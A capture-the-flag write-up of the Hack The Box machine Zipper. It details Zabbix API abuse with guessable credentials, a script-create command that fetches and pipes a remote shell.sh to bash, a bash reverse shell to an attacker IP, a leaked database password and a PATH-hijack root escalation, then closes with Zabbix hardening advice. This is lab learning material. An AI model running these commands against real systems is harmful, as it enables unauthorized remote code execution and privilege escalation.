---
title: HTB Zipper Writeup
date: 2025-02-08
categories: [CTF, HTB]
tags: [CTF, HTB, Hard]
description: HTB Zipper Writeup
---
# Recon
## Nmap
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
10050/tcp open  tcpwrapped
```

# Initial Foothold (Port 80)
Based on the open TCP port 10050, we can assume the server is running the Zabbix service. From the Zabbix documentation (https://www.zabbix.com/documentation/current/en/manual/installation/frontend), we can find that the home directory of the web frontend is /zabbix/

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_1.png)

Besides logging in with credentials, there is also an option to login as guest without password. This gives us an initial idea of what zabbix is about.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_2.png)

As expected, the guest account only have read access to items available on the frontend. By checking on "Monitoring" > "Latest data", it seems that one of the item was named "Zapper's Backup Script" which suggests that "zapper" is a possible username on the server.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_3.png)

## Checking Writeup and Hints
Having a potential username, I attempted to bruteforce the password on Zabbix using my own script. That did not work, and after reading some comments on the HTB forum (without spoilers), attempting to bruteforce with rockyou.txt is definitely overkill.

Having just a little peak at 0xdf's writeup (https://0xdf.gitlab.io/2019/02/23/htb-zipper.html), it turns out that I forgot about trying dumb credential combinations, aka using the username as password. That allowed me to move onto the next step

## GUI Access
Even though we've obtained the user credentials, the following prompt was shown informing that GUI access was disabled for this user.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_4.png)

Going back to Zabbix's documentation, there is an API section which documents on the available endpoints and how to use them (https://www.zabbix.com/documentation/current/en/manual/api/reference).

It uses the JSON-RPC 2.0 protocol through the "api_jsonrpc.php" endpoint. First we will need to perform the authentication to obtain a Bearer token. Then the token will be used in the Authorization header for all subsequent API requests. 

```bash
curl --request POST --url 'http://zipper.htb/zabbix/api_jsonrpc.php' --header 'Content-Type: application/json-rpc' --data '{"jsonrpc":"2.0", "method": "user.login", "params":{"user": "zapper", "password": "zapper"}, "id":"1"}'
```

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_5.png)

Going through the documentation, the first item that caught my eyes is the Script object (https://www.zabbix.com/documentation/current/en/manual/api/reference/script). This suggests that some user accounts (assumably administrators) can run custom scripts on the agents. First we would check if there is any existing commands in place.

(For some reason I was not able to access the endpoints using the Bearer token in the headers. However, I've found on https://sbcode.net/zabbix/zabbix-api-examples/ that the token can be used in the JSON object with the attribute 'auth')

```bash
curl --request POST --url 'http://zipper.htb/zabbix/api_jsonrpc.php' --header 'Content-Type: application/json-rpc' --data '{"auth":"3afb55af137e2836bcf73f5a37d4a57a", "jsonrpc":"2.0", "method": "script.get", "params":{"output": "extend"}, "id":"1"}'
```

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_6.png)
From the results, we can see that Linux commands were used in these scripts. This means that we should be able to perform remote code execution by creating a new script and execute it manually.

The following bash reverse shell (from revshells.com) will be used.

```bash
bash -i >& /dev/tcp/10.10.14.35/443 0>&1
```

Since it is a bit annoying to deal with escaping special characters, the reverse shell above was saved as 'shell.sh' and hosted on a python http server (port 8888) on the attacker machine.

With that, I've create a new script that retrieves the shellcode and execute it locally. Here we are using wget instead as curl does not exist on the host.

```bash
curl --request POST --url 'http://zipper.htb/zabbix/api_jsonrpc.php' --header 'Content-Type: application/json-rpc' --data '{"auth":"3afb55af137e2836bcf73f5a37d4a57a", "jsonrpc":"2.0", "method": "script.create", "params":{"name": "test", "command":"nohup wget http://10.10.14.35:8888/shell.sh -qO- | bash", "type":0, "scope":2}, "id":"1"}'
```

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_7.png)

The to execute the script, we will need to obtain the hostid first.

```bash
curl --request POST --url 'http://zipper.htb/zabbix/api_jsonrpc.php' --header 'Content-Type: application/json-rpc' --data '{"auth":"3afb55af137e2836bcf73f5a37d4a57a", "jsonrpc":"2.0", "method": "host.get", "params":{"output": "extend"}, "id":"1"}'
```

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_8.png)

Then we can listen on port 443 and execute the script.

```bash
curl --request POST --url 'http://zipper.htb/zabbix/api_jsonrpc.php' --header 'Content-Type: application/json-rpc' --data '{"auth":"3afb55af137e2836bcf73f5a37d4a57a", "jsonrpc":"2.0", "method": "script.execute", "params":{"hostid": "10105", "scriptid": "4"}, "id":"1"}'
```

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_9.png)

Note that in the script that we created, the "nohup" or "disown" commands were used. This is because the script will timeout after 60 seconds if there is no response from the command.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_10.png)

This means that a SIGHUP signal is sent to the process and its subprocesses, which then terminates the job. Using nohup or disown will protect the process from the SIGHUP signal and thus allow the reverse shell to remain intact after 60 seconds. (https://www.baeldung.com/linux/job-control-disown-nohup)

# User.txt
While enumerating the host, we can see that we are accessing a docker container based on the /.dockerenv file. So the initial thought was to find ways to break out of the container. However that lead to nowhere. I can also see there is a /backups directory with some password-protected 7zip archives. I've attempted to crack them but no luck either.

As observed that there are 2 hosts connected, I've tried to execute the same script with the other host id (10106). Surprisingly I still ended up in the same place which seems a bit weird.

Looking further in to the zabbix directory (/usr/share/zabbix), I've located the zabbix.conf.php file which is used for the database conenction.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_11.png)

The file contains the database name, username and password for connecting to the database.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_12.png)

And so I've connected to the database.

```bash
mysql -h 127.0.0.1 -u zabbix -p'f.YMeMd$pTbpY3-449'
```

However, for some reason the outputs of subsequent commands in the mysql shell does not show in stdout until an error is triggered. Nevertheless, I've attempted to crack the Admin hash but also resulted in nothing.

Here I suddenly realize that I can just grant the zapper account GUI access by modifying the database. So I've used the following SQL update query to grant all users GUI access to Zabbix.

(And after solving the box, I also realize that I can actually do this through the API.)

```sql
use zabbixdb;
update usrgrp set gui_access = 1;
```

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_13.png)

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_14.png)

This allows me to have a better look at the Scripts functionality. Looking in to the fields, I realized that you can choose to execute on the Zabbix agent or the Zabbix server. The script that we created through the API is currently executing on the server.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_15.png)

Since the Zipper host should be our target (which is an agent), changing the "Execute on" field to "Zabbix agent" should allow us to execute code from there. Note that the hostid should be changed to 10106.

When executing the original shell.sh, the shell died as soon as the connection was established. From the API response, it seems that the command simply returned successful thus killing the reverse shell process.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_16.png)
Therefore, the shell.sh is modified as below.

```bash
bash -i >& /dev/tcp/10.10.14.35/443 0>&1
```

Now we have shell access to the Zipper host.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_17.png)

After some enumeration on the host, some interesting files were found in the /home/zapper/utils/ directory. 

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_18.png)

First looking at the backup.sh file, it contained a password used to encrypt the 7zip archive we observed earlier.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_19.png)

And by using the password we can actually switch to the user zapper using su (need to spawn a tty shell first).

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_20.png)

# Root.txt
In the same /home/zapper/utils/ directory, we can see another ELF file "zabbix-service" with the SUID bit set. Some googling was done on the name of this binary, but no result was found about it. So this is probably a custom-built binary.

First we'll use ltrace to see what the binary is doing.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_21.png)

It simply asked for the user to input either "start" or "stop". We will try entering "start" first.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_22.png)

Note that it executed the "systemctl" command. Now if we choose "stop" instead.
![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_23.png)

It still executed "systemctl" with different arguments. Since it's using a relative path, we can hijack the script by modifying our PATH environment variable to include our custom binary and rename it to "systemctl".

I've decided to abuse the "start" option. Here I simply copied "/bin/bash" to "/home/zapper/systemctl" and created a file named "daemon-reload" with a simple "bash" command. Then the /home/zapper directory is added to the PATH environment variable.

```bash
cp /bin/bash /home/zapper/systemctl
echo "bash" > /home/zapper/daemon-reload
export PATH=/home/zapper:$PATH
```

With that, now we execute the "zabbix-service" binary again with the "start" option. And we have a bash shell as root.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_24.png)

# Extra
## zabbix-service source code
The source code of the zabbix-service can be found in /root/scripts/zabbix-service.c, although we've pretty much get the idea of how the binary works.

![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_25.png)

## Blocking Code Execution on Agent

Based on this documentation page (https://www.zabbix.com/documentation/current/en/manual/config/items/restrict_checks), there are 2 ways to block code execution based on agent versions. Both methods require modification to be done on the agent's configuration file (/etc/zabbix/zabbix_agentd.conf).

For agent version <5.0.2, we'll need to modify the configuration file to the following. And this is what we can do with the agent configuration on Zipper.
```
EnableRemoteCommand=0
```
![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_26.png)

This will block any remote commands from executing on the agent.
![Screenshot](/assets/img/htb-zipper-writeup-screenshot/image_27.png)

For agent version >=5.0.2 (including agent and agent2), this can be done by using a whitelist approach. The agent can determine what commands are allowed and denied based on the "AllowKey" and "DenyKey" in the configuration file. An example can be found on the same documentation page.
```
# Example

# Allow listing files in / with ls
AllowKey=system.run[ls -l /]

# Deny all other keys
DenyKey=*
```
# Lessons Learned
## Credential Testing Methodology
This box allowed me to review my methodology on testing user credentials. More specifically, on what combinations should I manually test before moving on with bruteforcing scripts or tools. I should keep in mind that any credential combination is possible, no matter how simple or obvious it may look.
## Reading documentation
The Zabbix service has detailed documentation from its basic components to advanced configurations available. While that is a lot of pages to go through, I've learned to try and narrow down to only those that could potentially be abused (e.g. script execution) or those that I need at the moment (e.g. authentication token). This way I can go through documentations a bit more efficiently without digging in too deep into rabbit holes.
